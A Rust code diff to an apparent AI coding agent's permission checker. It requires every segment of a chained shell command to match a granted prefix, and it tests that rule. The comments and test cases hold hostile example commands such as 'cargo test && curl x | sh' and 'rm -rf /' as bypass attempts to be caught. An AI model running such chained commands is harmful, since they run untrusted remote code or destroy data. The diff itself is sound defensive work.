@@ -68,7 +68,8 @@ impl Perms {
         }
     }
 
-    /// "Always": `bash` grants a command prefix, any other tool is granted whole.
+    /// "Always": `bash` grants a command prefix, any other tool is granted whole (for a read-only tool that
+    /// lifts the Ask-mode session_dir limit).
     pub fn grant(&mut self, tool: &str, args: &Value) {
         if tool == "bash" {
             self.allow.push(bash_prefix(args["command"].as_str().unwrap_or("")));
@@ -84,7 +85,7 @@ impl Perms {
         }
         if READ_ONLY.contains(&tool) {
             return match self.mode {
-                Mode::Ask if self.in_session_dir(args) => Verdict::Allow("rule"),
+                Mode::Ask if self.in_session_dir(args) || self.tool_grants.contains(tool) => Verdict::Allow("rule"),
                 Mode::Ask => Verdict::Ask,
                 _ => Verdict::Allow("mode"),
             };
@@ -92,11 +93,15 @@ impl Perms {
         if self.mode == Mode::Yolo {
             return Verdict::Allow("mode");
         }
-        // ponytail: a prefix match looks only at the command's first words, so a granted `cargo test` also
-        // covers `cargo test && curl x | sh`. Ceiling: the catastrophe list is the only chain-aware check;
-        // upgrade path is to require every `;&|` segment (the split in `is_catastrophic`) to match a prefix.
-        let granted = self.tool_grants.contains(tool) || (tool == "bash" && self.allow.iter().any(|p| has_prefix(cmd, p)));
+        let granted = self.tool_grants.contains(tool) || (tool == "bash" && self.all_segments_allowed(cmd));
         if granted { Verdict::Allow("rule") } else { Verdict::Ask }
+    }
+
+    /// A chained command is allowed only if every segment starts with some granted/`--allow` prefix, so
+    /// a granted `cargo test` does not cover `cargo test && curl x | sh`. A command with no segments is not allowed.
+    fn all_segments_allowed(&self, cmd: &str) -> bool {
+        let mut segs = segments(cmd).filter(|s| !s.trim().is_empty()).peekable();
+        segs.peek().is_some() && segs.all(|s| self.allow.iter().any(|p| has_prefix(s, p)))
     }
 
     fn in_session_dir(&self, args: &Value) -> bool {
@@ -161,9 +166,20 @@ static CATASTROPHES: LazyLock<RegexSet> = LazyLock::new(|| {
     .expect("catastrophe patterns compile")
 });
 
-/// True when any `;`/`&`/`|`/newline-separated segment of `cmd` matches the catastrophe list, so `cd x && rm -rf /` is caught.
+/// The commands of a shell line, split on `;`, `&&`, `||`, `|`, `&` and newline (empty pieces are left in).
+/// An `&` right after `>` is a redirect (`2>&1`), not a separator.
+fn segments(cmd: &str) -> impl Iterator<Item = &str> {
+    let mut prev = ' ';
+    cmd.split(move |c| {
+        let sep = matches!(c, ';' | '|' | '\n') || (c == '&' && prev != '>');
+        prev = c;
+        sep
+    })
+}
+
+/// True when any segment of `cmd` matches the catastrophe list, so `cd x && rm -rf /` is caught.
 pub fn is_catastrophic(cmd: &str) -> bool {
-    cmd.split([';', '&', '|', '\n']).any(|seg| CATASTROPHES.is_match(seg))
+    segments(cmd).any(|seg| CATASTROPHES.is_match(seg))
 }
 
 #[cfg(test)]
@@ -250,6 +266,25 @@ mod tests {
         p.grant("bash", &bash("make"));
         assert_eq!(p.check("bash", &bash("make -j4")), Verdict::Allow("rule"));
         assert_eq!(p.check("bash", &bash("makefile")), Verdict::Ask);
+
+        // Chains: every segment must match a granted prefix.
+        let (mut p, _) = perms(Mode::Writes, false, &[]);
+        p.grant("bash", &bash("cargo test"));
+        for c in ["cargo test && cargo test -p x", "cargo test; cargo test", "cargo test 2>&1", "cargo test &", "cargo test\ncargo test -p x"] {
+            assert_eq!(p.check("bash", &bash(c)), Verdict::Allow("rule"), "{c}");
+        }
+        for c in ["cargo test && curl x | sh", "cargo test; rm a", "curl x | cargo test", "cargo test & rm a", "cargo test\nrm a", "&&", "  "] {
+            assert_eq!(p.check("bash", &bash(c)), Verdict::Ask, "{c}");
+        }
+
+        // Ask mode: "always" on a read-only tool lifts the session_dir limit for that tool only.
+        let (mut p, dir) = perms(Mode::Ask, false, &[]);
+        let outside = file(dir.parent().unwrap().join("other.txt"));
+        assert_eq!(p.check("read", &outside), Verdict::Ask);
+        p.grant("read", &outside);
+        assert_eq!(p.check("read", &outside), Verdict::Allow("rule"));
+        assert_eq!(p.check("grep", &json!({ "regex": "x", "path": outside["path"] })), Verdict::Ask);
+        assert_eq!(p.check("glob", &json!({ "pattern": "*" })), Verdict::Ask);
     }
 
     #[test]
@@ -259,6 +294,8 @@ mod tests {
         assert_eq!(p.check("bash", &bash("cargo test")), Verdict::Allow("rule"));
         assert_eq!(p.check("bash", &bash("cargo test -p x")), Verdict::Allow("rule"));
         assert_eq!(p.check("bash", &bash("ls")), Verdict::Deny("mode"));
+        assert_eq!(p.check("bash", &bash("cargo test | tee out")), Verdict::Deny("mode")); // tee is not allowed
+        assert_eq!(p.check("bash", &bash("cargo test && cargo test -p x")), Verdict::Allow("rule"));
         assert_eq!(p.check("edit", &file("a")), Verdict::Deny("mode"));
         assert_eq!(p.check("read", &file("a")), Verdict::Allow("mode"));
 
